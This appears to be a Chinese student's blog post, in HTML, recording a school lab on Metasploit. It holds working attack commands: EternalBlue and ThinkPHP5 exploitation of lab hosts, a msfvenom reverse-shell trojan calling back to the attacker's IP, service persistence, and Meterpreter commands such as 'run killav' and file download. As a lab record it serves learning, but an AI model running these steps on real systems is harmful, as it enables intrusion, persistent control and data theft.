@@ -1,0 +1,302 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>MSF框架的学习 | asir的学习笔记</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言第一次遇见还是iscc我大哥带我的时候用的，那时觉得十分的方便。后续把理论知识学好了一定要学习学习，恰逢学校组织实训学习。以此文章记录学习。 MSFMetasploit，全称为 The Metasploit Framework，简称MSF。MSF 高度模块化，即框架由多个 module 组成，是全球最受欢迎的渗透测试工具之一 简单说来就是大型模板+脚本，方便渗透测试   Kali 系统 met">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSF框架的学习">
+<meta property="og:url" content="http://example.com/2023/10/27/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E5%B0%B1%E6%98%AF%E6%88%91/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/index.html">
+<meta property="og:site_name" content="asir的学习笔记">
+<meta property="og:description" content="前言第一次遇见还是iscc我大哥带我的时候用的，那时觉得十分的方便。后续把理论知识学好了一定要学习学习，恰逢学校组织实训学习。以此文章记录学习。 MSFMetasploit，全称为 The Metasploit Framework，简称MSF。MSF 高度模块化，即框架由多个 module 组成，是全球最受欢迎的渗透测试工具之一 简单说来就是大型模板+脚本，方便渗透测试   Kali 系统 met">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg">
+<meta property="article:published_time" content="2023-10-27T11:10:27.481Z">
+<meta property="article:modified_time" content="2023-10-27T18:10:03.468Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/10/27/%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E5%B0%B1%E6%98%AF%E6%88%91/%E6%B8%97%E9%80%8F%E6%A1%86%E6%9E%B6/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Error',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'MSF框架的学习',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-28 02:10:03'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">16</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="asir的学习笔记"><span class="site-name">asir的学习笔记</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">MSF框架的学习</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-10-27T11:10:27.481Z" title="Created 2023-10-27 19:10:27">2023-10-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-10-27T18:10:03.468Z" title="Updated 2023-10-28 02:10:03">2023-10-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="MSF框架的学习"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第一次遇见还是iscc我大哥带我的时候用的，那时觉得十分的方便。后续把理论知识学好了一定要学习学习，恰逢学校组织实训学习。以此文章记录学习。</p>
+<h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p><code>Metasploit</code>，全称为 <code>The Metasploit Framework</code>，简称<code>MSF</code>。<code>MSF</code> 高度模块化，即框架由多个 <code>module</code> 组成，是全球最受欢迎的渗透测试工具之一</p>
+<p>简单说来就是大型模板+脚本，方便渗透测试</p>
+<p><img src="file:///C:/Users/WangTao/Pictures/Typedown/44ef2361-6c21-4385-a480-9798349a708a.png" alt="44ef2361-6c21-4385-a480-9798349a708a"></p>
+<blockquote>
+<p><code>Kali</code> 系统 <code>metasploit</code> 框架目录路径: <code>/usr/share/metasploit-framework</code></p>
+</blockquote>
+<ol>
+<li><code>data</code>：包含metasploit用于存储某些漏洞、单词列表、图像等所需二进制文件的可编辑文件。</li>
+<li><code>documentation</code>：包含框架的可用文档。</li>
+<li><code>lib</code>：metasploit的库文件夹。</li>
+<li><code>plugins</code>：用来存放metasploit的插件。</li>
+<li><code>scripts</code>：用来存放metasploit的脚本，包括meterpreter及其它脚本。</li>
+<li><code>tools</code>：存放多种的命令行实用程序。</li>
+<li><code>modules</code>：存储metasploit的模块文件。</li>
+</ol>
+<h3 id="Metasploit模块简介"><a href="#Metasploit模块简介" class="headerlink" title="Metasploit模块简介"></a>Metasploit模块简介</h3><p><code>Metasploit-framework</code> 中分别有以下几种类型的模块：</p>
+<table>
+<thead>
+<tr>
+<th>模块名</th>
+<th>模块功能</th>
+<th>模块介绍</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>auxiliary</td>
+<td>辅助模块</td>
+<td>辅助渗透过程，例如主机发现，端口扫描，漏洞检测等</td>
+</tr>
+<tr>
+<td>exploits</td>
+<td>漏洞利用模块</td>
+<td>包含msf中所有的漏洞利用脚本，各模块按照漏洞影响的系统和交互方式，有着固定的存放路径。命名规则：操作系统&#x2F;协议类型</td>
+</tr>
+<tr>
+<td>payloads</td>
+<td>攻击载荷</td>
+<td>包含漏洞利用成功后在目标机器上执行的代码。包括反向shell、正向shell、meterpreter（msf中内置的远控木马）</td>
+</tr>
+<tr>
+<td>post</td>
+<td>后渗透模块</td>
+<td>包含漏洞利用成功获得目标系统访问权限后要做的操作，例如搜集敏感信息、提升权限等</td>
+</tr>
+<tr>
+<td>encoders</td>
+<td>编码器模块</td>
+<td>主要包含各种编码工具，对payload进行编码加密，已绕过入侵检测和过滤系统</td>
+</tr>
+<tr>
+<td>evasion</td>
+<td>免杀模块</td>
+<td>用来生成可以绕过反病毒软件检测的免杀payload</td>
+</tr>
+<tr>
+<td>nops</td>
+<td>空指令模块</td>
+<td>生成各种架构系统的空操作指令，用来提高payload的稳定性及扩充长度</td>
+</tr>
+</tbody></table>
+<p><code>metasploit</code>是一个分模块的大型框架，这样渗透的时候就会很有逻辑性，实用。</p>
+<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>MSF的一个独立的payload生成器，可以生成在目标机上直接运行的木马</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Options:</span></span><br><span class="line"><span class="function">    -<span class="title">l</span>,  --<span class="title">list</span>       &lt;<span class="title">type</span>&gt;            列出指定模块的所有可用资源. 模块类型包括: <span class="title">payloads</span>, <span class="title">encoders</span>, <span class="title">nops</span>, <span class="title">archs</span>, <span class="title">encrypt</span>, <span class="title">formats</span>, <span class="title">all</span></span></span><br><span class="line"><span class="function">    -<span class="title">p</span>, --<span class="title">payload</span>     &lt;<span class="title">payload</span>&gt;         指定使用的<span class="title">payload</span>(攻击载荷)。使用自定义的<span class="title">payload</span>，使用`-`或者<span class="title">stdin</span>指定</span></span><br><span class="line"><span class="function">        --<span class="title">list</span>-<span class="title">options</span>                  列出 <span class="title">payload</span> 的标准, 高级和规避选项</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">    -<span class="title">f</span>, --<span class="title">format</span>      &lt;<span class="title">format</span>&gt;            指定输出格式 (使用 --<span class="title">help</span>-<span class="title">formats</span> 来获取<span class="title">msf</span>支持的输出格式列表)</span></span><br><span class="line"><span class="function">    -<span class="title">e</span>, --<span class="title">encoder</span>     &lt;<span class="title">encoder</span>&gt;           指定需要使用的<span class="title">encoder</span>（编码器）</span></span><br><span class="line"><span class="function">        --<span class="title">sec</span>-<span class="title">name</span>    &lt;<span class="title">value</span>&gt;           生成大型<span class="title">Windows</span>二进制文件时要使用的新节名。默认值:随机4字节<span class="title">alpha</span>字符串</span></span><br><span class="line"><span class="function">        --<span class="title">smallest</span>                      使用所有可用的编码器生成最小的有效负载</span></span><br><span class="line"><span class="function">        --<span class="title">encrypt</span>     &lt;<span class="title">value</span>&gt;           适用于<span class="title">shellcode</span>的加密或编码类型(使用 --<span class="title">list</span> <span class="title">encrypt</span> 列出)</span></span><br><span class="line"><span class="function">        --<span class="title">encrypt</span>-<span class="title">key</span> &lt;<span class="title">value</span>&gt;           用于--<span class="title">encrypt</span>的密钥</span></span><br><span class="line"><span class="function">        --<span class="title">encrypt</span>-<span class="title">iv</span>  &lt;<span class="title">value</span>&gt;           --<span class="title">encrypt</span>的初始化向量</span></span><br><span class="line"><span class="function">    -<span class="title">a</span>, --<span class="title">arch</span>        &lt;<span class="title">architecture</span>&gt;     用于--<span class="title">payload</span>和--<span class="title">encoders</span>的体系结构(使用 --<span class="title">list</span> <span class="title">archs</span> 列出)</span></span><br><span class="line"><span class="function">        --<span class="title">platform</span>    &lt;<span class="title">platform</span>&gt;         指定<span class="title">payload</span>使用的平台（使用--<span class="title">list</span> <span class="title">platform</span>列出）</span></span><br><span class="line"><span class="function">    -<span class="title">o</span>, --<span class="title">out</span>         &lt;<span class="title">path</span>&gt;            保存<span class="title">payload</span></span></span><br><span class="line"><span class="function">    -<span class="title">b</span>, --<span class="title">bad</span>-<span class="title">chars</span>   &lt;<span class="title">list</span>&gt;              设定规避字符集，比如: &#x27;\<span class="title">x00</span>\<span class="title">xff</span>&#x27;</span></span><br><span class="line"><span class="function">    -<span class="title">n</span>, --<span class="title">nopsled</span>     &lt;<span class="title">length</span>&gt;            为<span class="title">payload</span>预先指定一个<span class="title">NOP</span>滑动长度</span></span><br><span class="line"><span class="function">        --<span class="title">pad</span>-<span class="title">nops</span>                      将由-<span class="title">n</span>指定的<span class="title">nopsled</span>大小用作总有效负载大小，自动添加<span class="title">nopsled</span>数量(<span class="title">nops</span>减去<span class="title">payload</span>长度)</span></span><br><span class="line"><span class="function">    -<span class="title">s</span>, --<span class="title">space</span>       &lt;<span class="title">length</span>&gt;            设定有效攻击荷载的最大长度</span></span><br><span class="line"><span class="function">        --<span class="title">encoder</span>-<span class="title">space</span> &lt;<span class="title">length</span>&gt;        编码的有效负载的最大大小（默认为-<span class="title">s</span> <span class="title">value</span>）</span></span><br><span class="line"><span class="function">    -<span class="title">i</span>, --<span class="title">iterations</span>  &lt;<span class="title">count</span>&gt;             指定<span class="title">payload</span>的编码次数</span></span><br><span class="line"><span class="function">    -<span class="title">c</span>, --<span class="title">add</span>-<span class="title">code</span>    &lt;<span class="title">path</span>&gt;              指定一个附加的<span class="title">win32</span> <span class="title">shellcode</span>文件</span></span><br><span class="line"><span class="function">    -<span class="title">x</span>, --<span class="title">template</span>    &lt;<span class="title">path</span>&gt;              指定一个自定义的可执行文件作为模板</span></span><br><span class="line"><span class="function">    -<span class="title">k</span>, --<span class="title">keep</span>                          保护模板程序的动作，注入的<span class="title">payload</span>作为一个新的进程运行</span></span><br><span class="line"><span class="function">    -<span class="title">v</span>, --<span class="title">var</span>-<span class="title">name</span>    &lt;<span class="title">name</span>&gt;            指定一个自定义的变量，以确定输出格式</span></span><br><span class="line"><span class="function">    -<span class="title">t</span>, --<span class="title">timeout</span>     &lt;<span class="title">second</span>&gt;          从<span class="title">STDIN</span>读取有效负载时要等待的秒数（默认为30，0 为禁用）</span></span><br><span class="line"><span class="function">    -<span class="title">h</span>, --<span class="title">help</span>                           查看帮助选项</span></span><br><span class="line"><span class="function">        --<span class="title">help</span>-<span class="title">formats</span>                   查看<span class="title">msf</span>支持的输出格式列表</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
+
+<p>选项很多，重点两个：<code>-p</code> <code>-f</code></p>
+<h2 id="MSF创建监听器"><a href="#MSF创建监听器" class="headerlink" title="MSF创建监听器"></a>MSF创建监听器</h2><p>可以直接用handler模块来开启监听</p>
+<p>会话详情可以实用session指令查看<br>    msf6 &gt; use exploit&#x2F;multi&#x2F;handler</p>
+<h2 id="Metasploit的Payload类型"><a href="#Metasploit的Payload类型" class="headerlink" title="Metasploit的Payload类型"></a>Metasploit的Payload类型</h2><ul>
+<li>Stageless payload<br> <code> Stageless payload: &lt;platform&gt;/[arch]/&lt;single&gt;</code></li>
+</ul>
+<p><code>Stageless payload</code> 是一个二进制文件，包含Meterpreter的所有必需部分以及所有必需的扩展全部捆绑在 一起，将完整的payload都编译在木马中，体积庞大，可直接独立地植入目标系统进行执行</p>
+<ul>
+<li>Staged payload<br>  <code>Staged payload: &lt;platform&gt;/[arch]/&lt;stage&gt;/&lt;stager&gt;</code></li>
+</ul>
+<p><code>Staged payload</code> 负责建立目标用户与攻击者之间的网络连接，将执行传递到另一个阶段，MSF提供了传输器和传输体配对分阶段植入的技术，由渗透攻击模块首先植入代码短小精悍且可靠的传输器载荷，然后在运行传输器载荷时进一步下载传输体载荷并执行，比如加载meterpreter、VNC桌面控制等复杂的大型攻击载荷。</p>
+<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>Meterpreter是一个高级的、动态的、可扩展的payload，简单理解是一个高级的cmd，里面封装了Metasploit的功能</p>
+<p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。使用它作为攻击载荷能够获得目标系统的一个Meterpreter shell的链接。</p>
+<p>Meterpreter shell 作为渗透模块有很多有用的功能，比如添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。</p>
+<ul>
+<li>Meterpreter使用</li>
+</ul>
+<p>会话管理：<br>    background：将当前session挂起<br>    sessions -l：列出当前所有的session<br>    sessions -i id：进入某个session</p>
+<p>常用命令：<br>    background #放回后台<br>    exit #关闭会话<br>    help #帮助信息<br>    sysinfo #系统平台信息<br>    screenshot #屏幕截取<br>    shell #命令行shell (exit退出)<br>    getlwd #查看本地目录<br>    lcd #切换本地目录<br>    getwd #查看目录<br>    ls #查看文件目录列表<br>    cd #切换目录<br>    rm #删除文件<br>    download C:\1.txt 1.txt #下载文件<br>    upload &#x2F;var&#x2F;www&#x2F;wce.exe wce.exe #上传 文件<br>    search -d c: -f *.doc #搜索文件<br>    execute -f cmd.exe -i #执行程序&#x2F;命令<br>    ps #查看进程<br>    getuid #查看当前用户权限<br>    run killav #关闭杀毒软件<br>    run getgui-e #启用远程桌面</p>
+<h1 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h1><p>我们这次的实验一学会msf的基本操作和用法，利用永恒之蓝这个漏洞加以锻炼</p>
+<p>实验具体包括</p>
+<ol>
+<li><p>使用主机发现模块探测目标网段存活主机</p>
+</li>
+<li><p>使用端口扫描模块对靶机1进行端口扫描</p>
+</li>
+<li><p>使用ms17-010漏洞利用模块攻击靶机1并获得shell</p>
+</li>
+<li><p>使用权限维持模块在靶机1上使用已有的会话进行权限维持并验证</p>
+</li>
+<li><p>使用端口扫描模块对靶机2进行端口扫描</p>
+</li>
+<li><p>使用thinkphp5-rce漏洞利用模块攻击靶机2</p>
+</li>
+</ol>
+<p>我对实验的总结：</p>
+<ol>
+<li><p>对search命令的使用</p>
+</li>
+<li><p>对msf框架中模块与模块的了解</p>
+</li>
+<li><p>对端口扫描方法的掌握</p>
+</li>
+<li><p>对使用msf的一般操作过程</p>
+</li>
+</ol>
+<h2 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h2><p>由于这个实验做的过程中出现了些许小问题，并由实验本身是并不太难的。我先把实验的命令行放在前面，后面再说遇到的问题</p>
+<p>实验步骤，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用端口扫描模块</span></span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">10.1</span><span class="number">.1</span><span class="number">.101</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 扫到永恒之蓝漏洞标志端口</span></span><br><span class="line"><span class="comment"># 查找使用过程</span></span><br><span class="line">search ms17-<span class="number">0</span>10</span><br><span class="line">use <span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">10.1</span><span class="number">.1</span><span class="number">.101</span></span><br><span class="line">check</span><br><span class="line">exploit</span><br><span class="line">background</span><br><span class="line"><span class="comment"># 新标签，制造payload过程</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<span class="number">10.1</span><span class="number">.1</span><span class="number">.91</span> -f exe -o tmp.exe</span><br><span class="line"><span class="comment"># 回去，制造监听器</span></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">10.1</span><span class="number">.1</span><span class="number">.91</span></span><br><span class="line"><span class="built_in">set</span> exitonsession false </span><br><span class="line">run -j</span><br><span class="line">//jobs</span><br><span class="line"><span class="comment"># 使用木马</span></span><br><span class="line">use post/windows/manage/persistence_exe</span><br><span class="line"><span class="built_in">set</span> rexepath /root/tmp.exe</span><br><span class="line"><span class="built_in">set</span> session <span class="number">1</span></span><br><span class="line"><span class="built_in">set</span> startup SERVICE</span><br><span class="line">run</span><br><span class="line">登录靶机重启</span><br><span class="line">shutdown -r -t <span class="number">0</span></span><br><span class="line">回来</span><br><span class="line"><span class="comment"># 扫靶机2的端口</span></span><br><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line"><span class="built_in">set</span> rhosts <span class="number">10.1</span><span class="number">.1</span><span class="number">.202</span></span><br><span class="line">run</span><br><span class="line"><span class="comment"># 登录可以看到使用了thinkphp5的web应用，我们直接搜索使用搞</span></span><br><span class="line">search thinkphp</span><br><span class="line">use <span class="number">0</span></span><br><span class="line"><span class="built_in">set</span> rhost <span class="number">10.1</span><span class="number">.1</span><span class="number">.202</span></span><br><span class="line"><span class="built_in">set</span> rport <span class="number">80</span></span><br><span class="line"><span class="built_in">set</span> lhost <span class="number">10.1</span><span class="number">.1</span><span class="number">.91</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>遇到的问题：</p>
+<ol>
+<li><p>tmp.exe位置不对，报错： Post failed: Msf::OptionValidateError One or more options failed to validate: REXEPATH.<br>原因，因为我打开的命令行是直接打开，而不是从root处打开，所以我的tmp.exe是放在根目录下的</p>
+</li>
+<li><p>攻击机ip不对：Handler failed to bind to 10.1.1.91:4444:-  -，搜索之后说是ip不对，ifconfig之后发现应该是对的，改了个10.1.1.255，可以了，重启也行。大概是端口冲了吧</p>
+</li>
+<li><p>到最后执行完thinkphp的模板漏洞之后server stopped，但是并没有给我弹回seterperter会话，我的猜测可能是之前太卡，我新开的命令端口，把前面的进程杀掉了。所以没有返回会话。</p>
+</li>
+<li><p>之后我在想复现到最后一个扫描端口的地方总是卡住，不知道什么原因世界未解之迷，建议官方整改</p>
+</li>
+</ol>
+<p>惊讶小秘密，这个靶机2还有个弱密码漏洞，123456.笑死</p>
+<h1 id="总结和下次awd"><a href="#总结和下次awd" class="headerlink" title="总结和下次awd"></a>总结和下次awd</h1><p>这次实验给的经验也是很足，结合上次awd可以发现其中可以学到的东西。（注，msf只是集成工具包的样子，其实这些操作完全也有其他术业专攻的工具能操作，此处只是注重讲解这里怎么操纵，具体原理每个操作的原理，其他实现方式会在专门的篇章记录）</p>
+<h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><ul>
+<li>搜索模块</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search aux /scanner/discovery</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                                                            Disclosure Date  Rank    Check  Description</span></span><br><span class="line">   -  ----                                                            ---------------  ----    -----  -----------</span><br><span class="line">   <span class="number">0</span>  auxiliary/scanner/discovery/arp_sweep                                            normal  No     ARP Sweep Local Network Discovery</span><br><span class="line">   <span class="number">1</span>  auxiliary/scanner/discovery/ipv6_multicast_ping                                  normal  No     IPv6 Link Local/Node Local Ping Discovery</span><br><span class="line">   <span class="number">2</span>  auxiliary/scanner/discovery/ipv6_neighbor                                        normal  No     IPv6 Local Neighbor Discovery</span><br><span class="line">   <span class="number">3</span>  auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement                   normal  No     IPv6 Local Neighbor Discovery Using Router Advertisement</span><br><span class="line">   <span class="number">4</span>  auxiliary/scanner/discovery/empty_udp                                            normal  No     UDP Empty Prober</span><br><span class="line">   <span class="number">5</span>  auxiliary/scanner/discovery/udp_probe                                            normal  No     UDP Service Prober</span><br><span class="line">   <span class="number">6</span>  auxiliary/scanner/discovery/udp_sweep                                            normal  No     UDP Service Sweeper</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>arp_sweep</code>：使用arp请求枚举本地局域网中的所有活跃主机</p>
+<p><code>udp_sweep</code>：通过发送UDP数据包探查指定主机是否活跃，并发现主机上的udp服务。</p>
+<ul>
+<li>模块使用</li>
+</ul>
+<blockquote>
+<p><code>arp_sweep</code> 模块使用方法</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep </span><br><span class="line"><span class="built_in">set</span> RHOSTS <span class="number">10.10</span><span class="number">.10</span><span class="number">.0</span>/<span class="number">24</span> </span><br><span class="line"><span class="built_in">set</span> THREADS <span class="number">50</span> run</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>设置好参数后输入<code>run</code>启动扫描器</p>
+</blockquote>
+<p>总结：称为脚本小子第一天：查找模块，查看参数，使用模块。使用模块做payload，使用模块payload，但是自己是不能当脚本小子滴。</p>
